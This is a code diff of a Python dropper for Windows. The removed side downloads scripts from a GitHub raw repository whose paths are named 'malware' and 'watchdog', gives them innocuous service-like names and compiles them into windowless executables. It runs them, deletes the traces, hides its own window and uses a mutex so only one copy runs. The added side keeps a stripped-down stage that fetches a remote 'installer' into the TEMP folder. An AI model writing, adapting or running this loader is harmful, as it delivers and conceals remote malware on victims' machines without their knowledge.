@@ -1,175 +1,36 @@
 import os
-import sys
+import random
 import urllib.request
 import subprocess
-import random
 import shutil
-import win32api
-import win32con
-import win32event
-import win32clipboard
-import ctypes
-import win32gui
-import pyautogui
 
-def create_mutex(mutex_name):
+global installer_url
+
+installer_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/fetch'
+
+def fetch_python_code(installer_url):
     try:
-        print(f"Creating mutex: {mutex_name}")
-        mutex = win32event.CreateMutex(None, 0, mutex_name)
-        if win32api.GetLastError() == 183:
-            print(f"Mutex {mutex_name} already exists.")
-            return False
-        print(f"Mutex {mutex_name} created successfully.")
-        return True
-    except Exception as e:
-        print(f"Error creating mutex: {e}")
-        return False
-
-if os.name == "nt":
-    mutex_name = "WindowsSessionHandler"
-    if not create_mutex(mutex_name):
-        print("Mutex already exists. Exiting program.")
-        sys.exit(0)
-
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
-]
-
-def fetch_python_code(url):
-    try:
-        print(f"Fetching code from URL: {url}")
-        user_agent = random.choice(user_agents)
+        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
         headers = {'User-Agent': user_agent}
-        req = urllib.request.Request(url, headers=headers)
+        req = urllib.request.Request(installer_url, headers=headers)
         with urllib.request.urlopen(req) as response:
-            code = response.read().decode('utf-8')
-        print(f"Code fetched successfully from {url}")
-        return code
+            return response.read().decode('utf-8')
     except Exception as e:
-        print(f"Error fetching URL {url}: {e}")
+        print(f"Error fetching code from {installer_url}: {e}")
         return None
 
-def write_python_file(code, filename):
+def write_python_file(installer_url):
     try:
+        code = fetch_python_code(installer_url)
         if code:
             temp_dir = os.getenv('TEMP')
-            py_file_path = os.path.join(temp_dir, filename)
-            print(f"Writing to file: {py_file_path}")
+            py_file_path = os.path.join(temp_dir, "installer.py")
             with open(py_file_path, 'w', encoding='utf-8') as f:
                 f.write(code)
-            print(f"File written successfully: {py_file_path}")
             return py_file_path
+        else:
+            print("Error: No code to write for installer.")
+            return None
     except Exception as e:
-        print(f"Error writing file {filename}: {e}")
-    return None
-
-def compile_python_to_exe(py_file_path):
-    try:
-        if py_file_path:
-            print(f"Starting pyinstaller for: {py_file_path}")
-            temp_dir = os.getenv('TEMP')
-            dist_folder = os.path.join(temp_dir, "dist")
-            build_folder = os.path.join(temp_dir, "build")
-
-            result = subprocess.run([
-                'pyinstaller',
-                '--onefile',
-                '--noconsole',
-                '--icon=NONE',
-                f'--distpath={dist_folder}',
-                f'--workpath={build_folder}',
-                py_file_path
-            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, timeout=600)
-
-            if result.returncode == 0:
-                print(f"EXE compiled successfully: {os.path.join(dist_folder, os.path.basename(py_file_path).replace('.py', '.exe'))}")
-                return os.path.join(dist_folder, os.path.basename(py_file_path).replace('.py', '.exe'))
-            else:
-                print(f"Error compiling {py_file_path} with PyInstaller. Return code: {result.returncode}")
-                print(f"STDOUT: {result.stdout.decode()}")
-                print(f"STDERR: {result.stderr.decode()}")
-    except subprocess.TimeoutExpired:
-        print(f"PyInstaller process timed out for {py_file_path}")
-    except Exception as e:
-        print(f"Error compiling {py_file_path}: {e}")
-    return None
-
-def execute_exe_file(exe_file_path):
-    try:
-        if exe_file_path:
-            print(f"Executing EXE file: {exe_file_path}")
-            os.chdir(str(exe_file_path.parent))
-            os.system(f"start {exe_file_path.name}")
-            print(f"Execution started for {exe_file_path}")
-    except Exception as e:
-        print(f"Error executing {exe_file_path}: {e}")
-
-def clean_up(temp_files):
-    try:
-        print(f"Cleaning up temporary files: {temp_files}")
-        for item in temp_files:
-            if os.path.exists(item):
-                if os.path.isdir(item):
-                    shutil.rmtree(item)
-                    print(f"Deleted directory: {item}")
-                else:
-                    os.remove(item)
-                    print(f"Deleted file: {item}")
-    except Exception as e:
-        print(f"Error cleaning up files: {e}")
-
-def install_and_execute(urls_and_filenames):
-    temp_dir = os.getenv('TEMP')
-    temp_files = []
-    exe_files = []
-
-    for url, filename in urls_and_filenames:
-        code = fetch_python_code(url)
-        if code:
-            py_file_path = write_python_file(code, filename)
-            if py_file_path:
-                temp_files.append(py_file_path)
-
-    for py_file_path in temp_files:
-        exe_file_path = compile_python_to_exe(py_file_path)
-        if exe_file_path:
-            exe_files.append(exe_file_path)
-
-    for exe_file_path in exe_files:
-        execute_exe_file(exe_file_path)
-
-    dist_folder = os.path.join(temp_dir, "dist")
-    build_folder = os.path.join(temp_dir, "build")
-    temp_files.extend([dist_folder, build_folder])
-    clean_up(temp_files)
-
-    sys.exit(0)
-
-urls_and_filenames = [
-    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
-    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
-    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
-]
-
-def set_invisible():
-    try:
-        hwnd = win32gui.GetForegroundWindow()
-        print(f"Making window with handle {hwnd} invisible.")
-        ctypes.windll.user32.ShowWindow(hwnd, 0)
-
-        extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
-        win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
-        win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)
-
-        win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
-
-        pyautogui.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()
-        print(f"Window successfully made invisible.")
-    except Exception as e:
-        print(f"Error setting window invisible: {e}")
-
-install_and_execute(urls_and_filenames)
+        print(f"Error writing installer file: {e}")
+        return None
